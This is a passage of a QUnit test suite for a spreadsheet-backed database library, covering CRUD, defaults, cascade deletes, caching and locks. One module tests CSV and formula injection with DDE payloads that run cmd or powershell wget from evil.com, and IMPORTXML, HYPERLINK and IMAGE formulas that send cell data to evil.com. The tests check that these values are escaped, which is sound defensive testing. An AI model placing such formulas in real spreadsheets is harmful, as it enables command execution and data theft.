      assert.ok(
        result.error.includes("Incomplete keyOrder"),
        "Error should mention incomplete keyOrder"
      );
    });

    QUnit.test("remove with non-existent ID", function (assert) {
      const result = db.remove(
        this.testTableName,
        this.testHistoryTableName,
        99999
      );

      assert.equal(result.status, 404, "Should return 404 for non-existent ID");
      assert.ok(result.error, "Should return error message");
    });

    QUnit.test("create with invalid data types", function (assert) {
      const result = db.create(
        this.testTableName,
        { name: 123, value: "invalid" }, // Wrong types
        ["name", "value"]
      );
      console.log(result);
      assert.equal(
        result.status,
        400,
        "Should return 400 for invalid data types"
      );
      assert.ok(result.error, "Should return error message");
    });

    QUnit.test("create with incomplete keyOrder", function (assert) {
      const result = db.create(
        this.testTableName,
        { name: "Test" }, // Missing required 'value' field
        ["name"] // keyOrder is incomplete - missing 'value'
      );

      assert.equal(
        result.status,
        400,
        "Should return 400 for incomplete keyOrder"
      );
      assert.ok(result.error, "Should return error message");
      assert.ok(
        result.error.includes("Incomplete keyOrder"),
        "Error should mention incomplete keyOrder"
      );
    });

    QUnit.test("create with missing required fields", function (assert) {
      const result = db.create(
        this.testTableName,
        { name: "Test" }, // Missing required 'value' field
        ["name", "value"] // Complete keyOrder but missing data
      );

      assert.equal(
        result.status,
        400,
        "Should return 400 for missing required fields"
      );
      assert.ok(result.error, "Should return error message");
      assert.ok(
        result.error.includes("Missing required fields"),
        "Error should mention missing required fields"
      );
    });

    // Test utility methods
    QUnit.module("Utility Methods Tests", {
      beforeEach: function (assert) {
        this.testTableName = "utility_test_table";
        this.testHistoryTableName = "utility_test_history";

        const tableConfig = {
          tableName: this.testTableName,
          historyTableName: this.testHistoryTableName,
          fields: {
            name: { type: "string", default: "Default Name" },
            count: { type: "number", default: 0 },
            active: { type: "boolean", default: true },
            created_at: { type: "date", default: "now" },
          },
        };

        this.tableConfig = tableConfig;

        db.createTable(tableConfig);
        db.putTableIntoDbContext(tableConfig);
      },

      afterEach: function (assert) {
        // Cleanup test data
        const allRecords = db.getAll(this.testTableName, {}, false);
        if (allRecords.status === 200 && allRecords.data) {
          for (const record of allRecords.data) {
            db.remove(this.testTableName, this.testHistoryTableName, record.id);
          }
        }
      },
    });

    QUnit.test("_getFieldIndex functionality", function (assert) {
      // This tests the internal _getFieldIndex method indirectly
      // by creating a record and checking if the field order is correct
      console.log("Starting test: _getFieldIndex functionality");
      const testData = { name: "Test Item", count: 5, active: false };
      const result = db.createWithLogs(
        this.testTableName,
        testData,
        Object.keys(testData)
      );

      console.log("params for the create", {
        tableName: this.testTableName,
        testData: testData,
        result: result,
        keyorder: Object.keys(testData),
      });

      assert.equal(result.status, 200, "Should create record successfully");
      assert.ok(result.action, "Should return a created action");

      // Verify the data was stored in correct order
      console.log("params for the read", {
        testTableName: this.testTableName,
        data_id_to_read: result.id,
      });
      const createdRecord = db.read(this.testTableName, result.id);
      console.log("params for the result of the read", {
        testTableName: this.testTableName,
        data_id_to_read: result.id,
        data_of_the_read: createdRecord.data,
      });
      assert.equal(
        createdRecord.status,
        200,
        "Should read record successfully"
      );
      assert.equal(
        createdRecord.data.name,
        "Test Item",
        "Name should be stored correctly"
      );
      assert.equal(
        createdRecord.data.count,
        5,
        "Count should be stored correctly"
      );
      assert.equal(
        createdRecord.data.active,
        false,
        "Active should be stored correctly"
      );
    });

    QUnit.test("_applyDefaults functionality", function (assert) {
      // Test that defaults are applied when fields are missing
      const testData = { name: "Partial Data" }; // Missing count, active, created_at
      console.log("Starting test: _applyDefaults functionality");
      console.log("params for the create", {
        tableName: this.testTableName,
        testData: testData,
        keyorder: Object.keys(this.tableConfig.fields),
      });
      const result = db.createWithLogs(
        this.testTableName,
        testData,
        Object.keys(this.tableConfig.fields) //<-- accounted for the default fields
      );
      console.log("result of the create in _applyDefaults", result);
      console.log("params for the read", {
        testTableName: this.testTableName,
        data_id_to_read: result.id,
      });

      assert.equal(result.status, 200, "Should create record successfully");
      assert.ok(result.action, "Should return a created action");

      // Verify defaults were applied
      const createdRecord = db.read(this.testTableName, result.id);
      console.log("params for the result of the read", {
        testTableName: this.testTableName,
        data_id_to_read: result.id,
        data_of_the_read: createdRecord.data,
      });
      assert.equal(
        createdRecord.status,
        200,
        "Should read record successfully"
      );
      assert.equal(
        createdRecord.data.name,
        "Partial Data",
        "Name should be as provided"
      );
      assert.equal(
        createdRecord.data.count,
        0,
        "Count should have default value"
      );
      assert.equal(
        createdRecord.data.active,
        true,
        "Active should have default value"
      );
      assert.ok(
        createdRecord.data.created_at,
        "Created_at should have default value"
      );
    });

    // Test many-to-many table configuration
    QUnit.module("Many-to-Many Table Configuration Tests", {
      beforeEach: function (assert) {
        this.testTableName = "many_to_many_test_table";
        this.testHistoryTableName = "many_to_many_test_history";
      },
    });

    QUnit.test("createManyToManyTableConfig functionality", function (assert) {
      console.log("Starting test: createManyToManyTableConfig functionality");
      // well have to create another 2 new tables to test this
      const userTableConfig = {
        tableName: "users",
        historyTableName: "users_history",
        fields: {
          name: "string",
          email: "string",
        },
      };
      const roleTableConfig = {
        tableName: "roles",
        historyTableName: "roles_history",
        fields: {
          name: "string",
        },
      };
      db.createTable(userTableConfig);
      db.createTable(roleTableConfig);
      db.putTableIntoDbContext(userTableConfig);
      db.putTableIntoDbContext(roleTableConfig);

      const config = {
        entity1TableName: userTableConfig.tableName,
        entity2TableName: roleTableConfig.tableName,
        fieldsRelatedToBothEntities: {
          created_at: "date",
          access_level: "string",
          valid_from: "date",
          valid_to: "date",
        },
      };

      const result = db.createManyToManyTableConfig(config);

      assert.equal(
        result.status,
        200,
        "Should create many-to-many table config successfully"
      );
      assert.ok(result.data, "Should return table configuration");
      assert.ok(result.data.fields, "Should have fields defined");

      // Verify the configuration has the expected structure
      console.log("result configuration for many-to-many table config", result);
      const fields = result.data.fields;

      assert.ok(
        Object.prototype.hasOwnProperty.call(
          fields,
          config.entity1TableName.toLocaleLowerCase() + "_id"
        ),
        "Should have entity1 primary key field"
      );
      assert.ok(
        Object.prototype.hasOwnProperty.call(
          fields,
          config.entity2TableName.toLocaleLowerCase() + "_id"
        ),
        "Should have entity2 primary key field"
      );
      assert.ok(
        Object.prototype.hasOwnProperty.call(fields, "created_at"),
        "Should have created_at field"
      );
      assert.ok(
        Object.prototype.hasOwnProperty.call(fields, "access_level"),
        "Should have access_level field"
      );
      assert.ok(
        Object.prototype.hasOwnProperty.call(fields, "valid_from"),
        "Should have valid_from field"
      );
      assert.ok(
        Object.prototype.hasOwnProperty.call(fields, "valid_to"),
        "Should have valid_to field"
      );
    });

    // Test cascade delete functionality using existing junction tables
    QUnit.module("Cascade Delete Tests (Junction Tables)", {
      beforeEach: function (assert) {
        console.log(
          "Starting beforeEach for cascade delete tests (junction tables)"
        );
        // Create required parent records using existing helpers
        console.log("Creating customer for cascade test...");
        const customer = JSON.parse(
          createCustomer({
            first_name: "Cascade",
            last_name: "Tester",
            email: "cascade.tester@example.com",
            address: "1 Junction Way",
            created_at: new Date(),
          })
        );
        console.log("Customer creation result:", customer);
        assert.equal(customer.status, 200, "Customer created for cascade test");
        this.customerId = customer.id;

        // Create category required by PRODUCT schema
        console.log("Creating category for cascade test...");
        const category = JSON.parse(
          createCategory({
            name: "Cascade Test Category",
            created_at: new Date(),
          })
        );
        console.log("Category creation result:", category);
        assert.equal(category.status, 200, "Category created for cascade test");
        this.categoryId = category.id;

        console.log("Creating product for cascade test...");
        const product = JSON.parse(
          createProduct({
            name: "Cascade Test Product",
            price: 10.0,
            category_fk: this.categoryId,
            created_at: new Date(),
          })
        );
        console.log("Product creation result:", product);
        assert.equal(product.status, 200, "Product created for cascade test");
        this.productId = product.id;

        console.log("Creating order for cascade test...");
        const order = JSON.parse(
          createOrder({
            customer_fk: this.customerId,
            created_at: new Date(),
          })
        );
        console.log("Order creation result:", order);
        assert.equal(order.status, 200, "Order created for cascade test");
        this.orderId = order.id;

        // Create junction record in ORDER_DETAIL linking order and product
        console.log("Creating junction record for cascade test...");
        const junctionData = {
          order_id: this.orderId,
          product_id: this.productId,
          quantity: 1,
          created_at: new Date(),
        };
        console.log("Junction data:", junctionData);
        const createJunction = db.createJunctionRecord(
          orderDetailConfig.tableName,
          junctionData,
          Object.keys(orderDetailConfig.fields)
        );
        console.log("Junction creation result:", createJunction);
        assert.equal(
          createJunction.status,
          200,
          "Junction record created for cascade test"
        );
      },

      afterEach: function (assert) {
        // Ensure no remaining ORDER_DETAIL for this order
        const allDetails = db.getAll(orderDetailConfig.tableName, {}, false);
        if (allDetails.status === 200 && Array.isArray(allDetails.data)) {
          for (const record of allDetails.data) {
            if (record.order_id === this.orderId) {
              db.remove(
                orderDetailConfig.tableName,
                orderDetailConfig.historyTableName,
                record.id
              );
            }
          }
        }

        // Clean up product and customer if they still exist
        if (this.productId) {
          JSON.parse(removeProduct(this.productId));
        }
        if (this.customerId) {
          JSON.parse(removeCustomer(this.customerId));
        }
        if (this.categoryId) {
          JSON.parse(removeCategory(this.categoryId));
        }
      },
    });

    QUnit.test("removeWithCascade functionality (junction)", function (assert) {
      assert.ok(this.orderId, "orderId should be set in beforeEach");
      assert.ok(this.productId, "productId should be set in beforeEach");
      assert.ok(this.customerId, "customerId should be set in beforeEach");
      // Verify we have at least one ORDER_DETAIL for the created order
      const beforeDetails = db.getAll(orderDetailConfig.tableName, {}, false);
      // console.log(
      //   "beforeDetails for removeWithCascade functionality (junction)",
      //   beforeDetails
      // );
      assert.equal(
        beforeDetails.status,
        200,
        "Should get ORDER_DETAIL records"
      );
      const relatedBefore = (beforeDetails.data || []).filter(
        (r) => r.order_id === this.orderId
      );
      assert.ok(
        relatedBefore.length > 0,
        "Should have related junction records"
      );

      // Delete ORDER with cascade; should remove related ORDER_DETAIL rows
      const deleteOrderResult = db.removeWithCascade(
        orderTableConfig.tableName,
        orderTableConfig.historyTableName,
        this.orderId
      );
      assert.equal(deleteOrderResult.status, 200, "Order deleted with cascade");

      // Verify ORDER is deleted
      const readOrderResult = db.read(orderTableConfig.tableName, this.orderId);
      assert.equal(readOrderResult.status, 404, "Order should be deleted");

      // Verify related ORDER_DETAIL records are deleted
      const afterDetails = db.getAll(orderDetailConfig.tableName, {}, false);
      assert.equal(
        afterDetails.status,
        200,
        "Should get ORDER_DETAIL after delete"
      );
      const relatedAfter = (afterDetails.data || []).filter(
        (r) => r.order_id === this.orderId
      );
      assert.equal(relatedAfter.length, 0, "Related junction records removed");
    });

    // Test schema normalization
    QUnit.module("Schema Normalization Tests", {
      beforeEach: function (assert) {
        this.testTableName = "schema_norm_test_table";
        this.testHistoryTableName = "schema_norm_test_history";
      },
    });

    QUnit.test("_normalizeSchemaFields functionality", function (assert) {
      console.log("Starting test: _normalizeSchemaFields functionality");
      // This tests the internal _normalizeSchemaFields method indirectly
      // by creating a table with various field configurations
      const tableConfig = {
        tableName: this.testTableName,
        historyTableName: this.testHistoryTableName,
        fields: {
          name: { type: "string" },
          description: { type: "string", default: "hiiii" },
          count: { type: "number", default: 0 },
          created_at: { type: "date", default: "now" },
          test_null: {
            type: "string",
            default: null,
            treatNullStringAsMissing: true,
          },
          test_empty_string: {
            type: "string",
            default: "",
            treatEmptyStringAsMissing: true,
          },
          test_boolean: { type: "boolean", default: false },
          test_date: {
            type: "date",
            default: new Date("2025-01-01"),
            treatNullAsMissing: true,
          },
          test_string: { type: "string", default: "hello" },
          test_number: { type: "number", default: 100.5 },
          test_boolean_2: { type: "boolean", default: true },
          test_date_2: { type: "date", default: new Date("2025-01-01") },
        },
      };

      const result = db.createTable(tableConfig);
      assert.equal(result.status, 200, "Should create table successfully");

      // Verify table was created and can be used
      db.putTableIntoDbContext(tableConfig);

      // Provide all required fields in testData, using default values where appropriate
      const testData = {
        name: "Schema Test",
      };
      const createResult = db.createWithLogs(
        this.testTableName,
        testData,
        Object.keys(tableConfig.fields)
      );
      assert.equal(
        createResult.status,
        200,
        "Should create record successfully"
      );
    });

    // CSV Injection Security Tests
    QUnit.module("CSV Injection Security Tests", function () {
      QUnit.test("Basic Formula Injection Prevention", function (assert) {
        function redactEmailForLogs_(email) {
          if (typeof email !== "string") return email;
          const at = email.indexOf("@");
          if (at === -1) return email.length ? email.charAt(0) + "***" : "";
          return email.length ? email.charAt(0) + "***" + email.slice(at) : "";
        }

        const tableConfig = {
          tableName: "USERS_MALICIOUS_FORMULA_PREVENTION",
          fields: { name: "string", email: "string" },
        };
        db.createTable(tableConfig);
        db.putTableIntoDbContext(tableConfig);

        // Attempt injection with common formula starters
        const testCases = [
          { name: "=1+1", email: "formula@test.com" },
          { name: "+1+1", email: "plus@test.com" },
          { name: "-1-1", email: "minus@test.com" },
          { name: "@SUM(A1:A10)", email: "at@test.com" },
        ];

        testCases.forEach(function (testData, index) {
          console.log("[CSV Injection] Basic Formula Injection Prevention", {
            case: index + 1,
            inputName: testData && testData.name,
            inputEmail: redactEmailForLogs_(testData && testData.email),
          });

          const result = db.create(
            "USERS_MALICIOUS_FORMULA_PREVENTION",
            testData,
            ["name", "email"]
          );
          console.log("[CSV Injection] create result", {
            case: index + 1,
            status: result && result.status,
            id: result && result.id,
            error: result && result.error,
            message: result && result.message,
          });
          assert.equal(result.status, 200, "Create should succeed");

          const record = db.read(
            "USERS_MALICIOUS_FORMULA_PREVENTION",
            result.id
          );
          const storedName = record && record.data && record.data.name;
          console.log("[CSV Injection] read result", {
            case: index + 1,
            status: record && record.status,
            id: result && result.id,
            storedNameType: typeof storedName,
            storedName: storedName,
            dataKeys:
              record && record.data ? Object.keys(record.data).sort() : null,
          });
          assert.equal(record.status, 200, "Read should succeed");

          // Check if the dangerous character was escaped
          const isEscaped =
            typeof storedName === "string" && storedName.startsWith("'");

          assert.ok(
            isEscaped,
            `Test case ${index + 1}: "${
              testData.name
            }" should be sanitized (storedName=${JSON.stringify(
              storedName
            )}, type=${typeof storedName})`
          );
        });
      });

      QUnit.test(
        "Command Execution Prevention (DDE Attacks)",
        function (assert) {
          const tableConfig = {
            tableName: "MALICIOUS_DDE_ATTACK_PREVENTION",
            fields: { payload: "string", description: "string" },
          };
          db.createTable(tableConfig);
          db.putTableIntoDbContext(tableConfig);

          // Attempt DDE attacks
          const ddeCases = [
            '=cmd|"/c calc"!A1',
            '=cmd|"/c powershell wget http://evil.com/shell.ps1"!A1',
            '@SUM(1+1)*cmd|"/c calc"!A1',
          ];

          ddeCases.forEach(function (payload, index) {
            console.log("[CSV Injection] DDE Attacks", {
              case: index + 1,
              inputPayloadType: typeof payload,
              inputPayloadPreview:
                typeof payload === "string" ? payload.slice(0, 80) : payload,
            });

            const result = db.create(
              "MALICIOUS_DDE_ATTACK_PREVENTION",
              {
                payload: payload,
                description: "DDE test case",
              },
              ["payload", "description"]
            );
            console.log("[CSV Injection] DDE create result", {
              case: index + 1,
              status: result && result.status,
              id: result && result.id,
              error: result && result.error,
              message: result && result.message,
            });
            assert.equal(result.status, 200, "Create should succeed");

            const record = db.read(
              "MALICIOUS_DDE_ATTACK_PREVENTION",
              result.id
            );
            const storedPayload = record && record.data && record.data.payload;
            console.log("[CSV Injection] DDE read result", {
              case: index + 1,
              status: record && record.status,
              id: result && result.id,
              storedPayloadType: typeof storedPayload,
              storedPayloadPreview:
                typeof storedPayload === "string"
                  ? storedPayload.slice(0, 120)
                  : storedPayload,
              dataKeys:
                record && record.data ? Object.keys(record.data).sort() : null,
            });
            assert.equal(record.status, 200, "Read should succeed");

            const isEscaped =
              typeof storedPayload === "string" &&
              storedPayload.startsWith("'");

            assert.ok(
              isEscaped,
              `DDE case ${index + 1} should be blocked: "${payload.substring(
                0,
                30
              )}..."`
            );
          });
        }
      );

      QUnit.test("Data Exfiltration Prevention", function (assert) {
        const tableConfig = {
          tableName: "EXFIL_TEST_DATA_EXFILTRATION_PREVENTION",
          fields: { data: "string", type: "string" },
        };
        db.createTable(tableConfig);
        db.putTableIntoDbContext(tableConfig);

        // Attempt data exfiltration
        const exfilCases = [
          '=IMPORTXML("http://evil.com/?data="&A1:Z100, "//a")',
          '=HYPERLINK("http://evil.com/steal?data="&A1,"Click")',
          '=IMAGE("http://evil.com/track?data="&A1)',
        ];

        exfilCases.forEach(function (payload, index) {
          console.log("[CSV Injection] Exfiltration", {
            case: index + 1,
            inputPayloadType: typeof payload,
            inputPayloadPreview:
              typeof payload === "string" ? payload.slice(0, 100) : payload,
          });

          const result = db.create(
            "EXFIL_TEST_DATA_EXFILTRATION_PREVENTION",
            {
              data: payload,
              type: "exfil attempt",
            },
            ["data", "type"]
          );
          console.log("[CSV Injection] Exfil create result", {
            case: index + 1,
            status: result && result.status,
            id: result && result.id,
            error: result && result.error,
            message: result && result.message,
          });
          assert.equal(result.status, 200, "Create should succeed");

          const record = db.read(
            "EXFIL_TEST_DATA_EXFILTRATION_PREVENTION",
            result.id
          );
          const storedData = record && record.data && record.data.data;
          console.log("[CSV Injection] Exfil read result", {
            case: index + 1,
            status: record && record.status,
            id: result && result.id,
            storedDataType: typeof storedData,
            storedDataPreview:
              typeof storedData === "string"
                ? storedData.slice(0, 140)
                : storedData,
            dataKeys:
              record && record.data ? Object.keys(record.data).sort() : null,
          });
          assert.equal(record.status, 200, "Read should succeed");

          const isEscaped =
            typeof storedData === "string" && storedData.startsWith("'");

          assert.ok(isEscaped, `Exfil case ${index + 1} should be blocked`);
        });
      });

      QUnit.test("Normal Data Integrity", function (assert) {
        const tableConfig = {
          tableName: "NORMAL_DATA_INTEGRITY_PREVENTION",
          fields: {
            name: "string",
            email: "string",
            age: "number",
            active: "boolean",
            created: "date",
          },
        };
        db.createTable(tableConfig);
        db.putTableIntoDbContext(tableConfig);

        // Normal, safe data
        const normalData = {
          name: "John Doe",
          email: "john.doe@example.com",
          age: 30,
          active: true,
          created: new Date("2024-01-15"),
        };

        const result = db.create(
          "NORMAL_DATA_INTEGRITY_PREVENTION",
          normalData,
          ["name", "email", "age", "active", "created"]
        );
        assert.equal(result.status, 200, "Create should succeed");

        const record = db.read("NORMAL_DATA_INTEGRITY_PREVENTION", result.id);
        assert.equal(record.status, 200, "Read should succeed");

        // Verify data integrity
        assert.equal(record.data.name, "John Doe", "Name should be unchanged");
        assert.equal(
          record.data.email,
          "john.doe@example.com",
          "Email should be unchanged"
        );
        assert.equal(record.data.age, 30, "Age should be unchanged");
        // Note: active is stored as string in the sheet
        assert.ok(
          record.data.active === true || record.data.active === "true",
          "Active should be unchanged"
        );
      });

      QUnit.test("Update Operation Security", function (assert) {
        const tableConfig = {
          tableName: "UPDATES_MALICIOUS_DATA_INTEGRITY_PREVENTION",
          fields: { name: "string", status: "string" },
        };
        db.createTable(tableConfig);
        db.putTableIntoDbContext(tableConfig);

        // Create normal record
        const createResult = db.create(
          "UPDATES_MALICIOUS_DATA_INTEGRITY_PREVENTION",
          {
            name: "Normal User",
            status: "active",
          },
          ["name", "status"]
        );
        assert.equal(createResult.status, 200, "Create should succeed");

        // Try to update with malicious data
        const updateResult = db.update(
          "UPDATES_MALICIOUS_DATA_INTEGRITY_PREVENTION",
          createResult.id,
          {
            name: '=cmd|"/c calc"!A1',
            status: "=1+1",
          },
          ["name", "status"]
        );
        assert.equal(updateResult.status, 200, "Update should succeed");

        const record = db.read(
          "UPDATES_MALICIOUS_DATA_INTEGRITY_PREVENTION",
          createResult.id
        );
        assert.equal(record.status, 200, "Read should succeed");

        const nameEscaped = record.data.name.startsWith("'");
        const statusEscaped = record.data.status.startsWith("'");

        assert.ok(nameEscaped, "Update name should be sanitized");
        assert.ok(statusEscaped, "Update status should be sanitized");
      });

      QUnit.test("Edge Cases", function (assert) {
        const tableConfig = {
          tableName: "EDGE_CASES_MALICIOUS_DATA_INTEGRITY_PREVENTION",
          fields: { test: "string" },
        };
        db.createTable(tableConfig);
        db.putTableIntoDbContext(tableConfig);

        const edgeCases = [
          { value: "", description: "Empty string" },
          { value: " =1+1", description: "Space before formula" },
          { value: "==1+1", description: "Double equals" },
          { value: "\t=1+1", description: "Tab character" },
          { value: "\r=1+1", description: "Carriage return" },
          { value: "Normal=1+1", description: "Formula in middle" },
        ];

        edgeCases.forEach(function (testCase, index) {
          const result = db.create(
            "EDGE_CASES_MALICIOUS_DATA_INTEGRITY_PREVENTION",
            { test: testCase.value },
            ["test"]
          );
          assert.equal(result.status, 200, "Create should succeed");

          const record = db.read(
            "EDGE_CASES_MALICIOUS_DATA_INTEGRITY_PREVENTION",
            result.id
          );
          assert.equal(record.status, 200, "Read should succeed");

          // Log the result for debugging
          console.log(
            `Case ${index + 1} (${testCase.description}): "${
              testCase.value
            }" -> "${record.data.test}"`
          );

          // Empty string should remain empty
          if (testCase.value === "") {
            assert.equal(
              record.data.test,
              "",
              `Case ${index + 1}: Empty string should remain empty`
            );
          }
          // Values starting with dangerous chars should be escaped
          else if (
            testCase.value.charAt(0) === "=" ||
            testCase.value.charAt(0) === "+" ||
            testCase.value.charAt(0) === "-" ||
            testCase.value.charAt(0) === "@" ||
            testCase.value.charAt(0) === "\t" ||
            testCase.value.charAt(0) === "\r"
          ) {
            assert.ok(
              record.data.test.startsWith("'"),
              `Case ${index + 1}: "${testCase.description}" should be escaped`
            );
          }
          // Values with formula in middle should not be escaped (not starting with dangerous char)
          else if (testCase.description === "Formula in middle") {
            assert.equal(
              record.data.test,
              testCase.value,
              `Case ${index + 1}: Formula in middle should not be escaped`
            );
          }
        });
      });

      QUnit.test("Quick Security Check", function (assert) {
        const tableConfig = {
          tableName: "QUICK_TEST_MALICIOUS_DATA_INTEGRITY_PREVENTION",
          fields: { payload: "string" },
        };
        db.createTable(tableConfig);
        db.putTableIntoDbContext(tableConfig);

        // Test the most common attack vector
        const result = db.create(
          "QUICK_TEST_MALICIOUS_DATA_INTEGRITY_PREVENTION",
          {
            payload: '=cmd|"/c calc"!A1',
          },
          ["payload"]
        );
        assert.equal(result.status, 200, "Create should succeed");

        const record = db.read(
          "QUICK_TEST_MALICIOUS_DATA_INTEGRITY_PREVENTION",
          result.id
        );
        assert.equal(record.status, 200, "Read should succeed");

        assert.ok(
          record.data.payload.startsWith("'"),
          "Malicious payload should be escaped"
        );
        assert.equal(
          record.data.payload,
          '\'=cmd|"/c calc"!A1',
          "Payload should be stored as text with leading quote"
        );
      });
    });
  });
}

// Second test runner for advanced tests (Cache, Lock, Validation, etc.)
function runnerAdvanced() {
  return new Promise((resolve, reject) => {
    const db = getDb_();

    const categoryTableConfig = {
      tableName: "CATEGORY",
      historyTableName: "DELETED_CATEGORY",
      fields: {
        name: "string",
        created_at: "date",
      },
    };

    const productTableConfig = {
      tableName: "PRODUCT",
      historyTableName: "DELETED_PRODUCT",
      fields: {
        name: "string",
        price: "number",
        category_fk: "number",
        created_at: "date",
      },
    };

    const customerTableConfig = {
      tableName: "CUSTOMER",
      historyTableName: "DELETED_CUSTOMER",
      fields: {
        name: "string",
        email: "string",
        created_at: "date",
      },
    };

    const orderTableConfig = {
      tableName: "ORDER",
      historyTableName: "DELETED_ORDER",
      fields: {
        customer_fk: "number",
        order_date: "date",
        total: "number",
        created_at: "date",
      },
    };

    const orderDetailConfig = {
      tableName: "ORDER_DETAIL",
      historyTableName: "DELETED_ORDER_DETAIL",
      fields: {
        order_fk: "number",
        product_fk: "number",
        quantity: "number",
        unit_price: "number",
        created_at: "date",
      },
    };

    // Track all tests and current test for the results
    let allTests = [];
    let currentTest = null;

    // QUnit event handlers
    QUnit.on("testStart", (testStart) => {
      currentTest = {
        name: testStart.name,
        suiteName: testStart.moduleName,
        fullName: testStart.fullName,
        assertions: [],
        errors: [],
        status: "running",
        sourceCode: getIndividualTestCode(testStart.name),
      };
    });

    QUnit.on("assertion", (assertion) => {
      if (currentTest) {
        currentTest.assertions.push({
          passed: assertion.passed,
          message: assertion.message,
          actual: assertion.actual,
          expected: assertion.expected,
          stack: assertion.stack,
        });
      }
    });

    QUnit.on("testEnd", (testEnd) => {
      if (currentTest) {
        currentTest.status = testEnd.status;
        currentTest.runtime = testEnd.runtime;
        allTests.push({ ...currentTest });
        currentTest = null;
      }
    });

    QUnit.on("runEnd", (runEnd) => {
      console.log("[ADVANCED TEST SUITE COMPLETED]: ", runEnd);

      const results = {
        testCounts: {
          passed: runEnd.testCounts.passed,
          failed: runEnd.testCounts.failed,
          skipped: runEnd.testCounts.skipped,
          todo: runEnd.testCounts.todo,
          total: runEnd.testCounts.total,
        },
        runtime: runEnd.runtime,
        status: runEnd.status,
        tests: allTests.map((test) => ({
          name: test.name,
          suiteName: test.suiteName,
          fullName: test.fullName,
          status: test.status,
          runtime: test.runtime,
          assertions: test.assertions.map((assertion) => ({
            message: String(assertion.message || ""),
            result: Boolean(assertion.result),
            expected: String(assertion.expected || ""),
            actual: String(assertion.actual || ""),
            source: String(assertion.source || ""),
            module: String(assertion.module || ""),
            // Remove 'source' and other potentially problematic fields
          })),
          errors: test.errors.map((error) => ({
            message: String(error.message || ""),
            source: String(error.source || ""),
            runtime: String(error.runtime || ""),
            // Remove 'source' and other potentially problematic fields
          })),
          sourceCode: String(test.sourceCode || ""),
        })),
        sourceCode: String(getTestSourceCode()),
      };

      resolve(results);
    });

    QUnit.start();

    // ===== ADVANCED TESTS START HERE =====
    // These are the tests that start around line 2912 in the original

    // Test cache functionality
    QUnit.module("Cache Functionality Tests", {
      beforeEach: function (assert) {
        this.testTableName = "cache_test_table";
        this.testHistoryTableName = "cache_test_history";

        const tableConfig = {
          tableName: this.testTableName,
          historyTableName: this.testHistoryTableName,
          fields: {
            name: "string",
            value: "number",
          },
        };

        db.createTable(tableConfig);
        db.putTableIntoDbContext(tableConfig);

        // Create some test data
        const testData = [
          { name: "Cache Item 1", value: 100 },
          { name: "Cache Item 2", value: 200 },
          { name: "Cache Item 3", value: 300 },
        ];

        for (const data of testData) {
          db.create(this.testTableName, data, Object.keys(data));
        }
      },

      afterEach: function (assert) {
        // Cleanup test data
        const allRecords = db.getAll(this.testTableName, {}, false);
        if (allRecords.status === 200 && allRecords.data) {
          for (const record of allRecords.data) {
            db.remove(this.testTableName, this.testHistoryTableName, record.id);
          }
        }
      },
    });

    QUnit.test("getAll with caching enabled", function (assert) {
      console.log("Starting test: getAll with caching enabled");
      // First call should cache the data
      const result1 = db.getAll(this.testTableName, {}, true);
      assert.equal(result1.status, 200, "First call should succeed");
      assert.ok(result1.data, "Should return data");

      // Second call should use cache
      const result2 = db.getAll(this.testTableName, {}, true);
      assert.equal(result2.status, 200, "Second call should succeed");
      assert.ok(result2.data, "Should return cached data");

      // Both results should be identical
      assert.deepEqual(
        result1.data,
        result2.data,
        "Cached results should be identical"
      );
    });

    QUnit.test("getAll with caching disabled", function (assert) {
      console.log("Starting test: getAll with caching disabled");
      // First call without cache
      const result1 = db.getAll(this.testTableName, {}, false);
      assert.equal(result1.status, 200, "First call should succeed");
      assert.ok(result1.data, "Should return data");

      // Second call without cache
      const result2 = db.getAll(this.testTableName, {}, false);
      assert.equal(result2.status, 200, "Second call should succeed");
      assert.ok(result2.data, "Should return fresh data");

      // Results should be identical (same data, fresh fetch)
      assert.deepEqual(
        result1.data,
        result2.data,
        "Fresh results should be identical"
      );
    });

    // Test lock service functionality
    QUnit.module("Lock Service Tests", {
      beforeEach: function (assert) {
        this.testTableName = "lock_test_table";
        this.testHistoryTableName = "lock_test_history";

        const tableConfig = {
          tableName: this.testTableName,
          historyTableName: this.testHistoryTableName,
          fields: {
            name: "string",
            value: "number",
          },
        };

        db.createTable(tableConfig);
        db.putTableIntoDbContext(tableConfig);
      },

      afterEach: function (assert) {
        // Cleanup test data
        const allRecords = db.getAll(this.testTableName, {}, false);
        if (allRecords.status === 200 && allRecords.data) {
          for (const record of allRecords.data) {
            db.remove(this.testTableName, this.testHistoryTableName, record.id);
          }
        }
      },
    });

    QUnit.test("releaseLocks functionality", function (assert) {
      console.log("Starting test: releaseLocks functionality");
      // This tests the releaseLocks method
      // Create a record to trigger lock acquisition
      const testData = { name: "Lock Test", value: 100 };
      const createResult = db.create(
        this.testTableName,
        testData,
        Object.keys(testData)
      );

      assert.equal(
        createResult.status,
        200,
        "Should create record successfully"
      );

      // Release all locks
      db.releaseLocks();

      // Try to read the record (should work after lock release)
      const readResult = db.read(this.testTableName, createResult.id);
      assert.equal(
        readResult.status,
        200,
        "Should read record after lock release"
      );
      assert.ok(readResult.data, "Should return data after lock release");
    });

    // Test table integrity and validation
    QUnit.module("Table Integrity and Validation Tests", {
      beforeEach: function (assert) {
        this.testTableName = "integrity_test_table";
        this.testHistoryTableName = "integrity_test_history";

        const tableConfig = {
          tableName: this.testTableName,
          historyTableName: this.testHistoryTableName,
          fields: {
            name: "string",
            email: "string",
            age: { type: "number", default: 25 },
          },
        };

        db.createTable(tableConfig);
        db.putTableIntoDbContext(tableConfig);
      },

      afterEach: function (assert) {
        // Cleanup test data
        const allRecords = db.getAll(this.testTableName, {}, false);
        if (allRecords.status === 200 && allRecords.data) {
          for (const record of allRecords.data) {
            db.remove(this.testTableName, this.testHistoryTableName, record.id);
          }
        }
      },
    });

    QUnit.test("_validateData with valid data", function (assert) {
      console.log("Starting test: _validateData with valid data");
      // This tests the internal _validateData method indirectly
      const validData = {
        name: "Valid User",
        email: "user@example.com",
        age: 25,
      };
      const result = db.create(
        this.testTableName,
        validData,
        Object.keys(validData)
      );

      assert.equal(result.status, 200, "Should create record with valid data");
      assert.ok(result.data, "Should return created data");
    });

    QUnit.test("_validateData with invalid age", function (assert) {
      console.log("Starting test: _validateData with invalid age");
      // This tests validation of age constraints
      const invalidData = {
        name: "Invalid User",
        email: "user@example.com",
        age: -5,
      };
      const result = db.create(
        this.testTableName,
        invalidData,
        Object.keys(invalidData)
      );

      // Note: This test assumes the validation is implemented
      // If validation is not implemented, this will pass
      if (result.status === 400) {
        assert.ok(result.error, "Should return error for invalid age");
      } else {
        assert.ok(true, "Validation not implemented for age constraints");
      }
    });

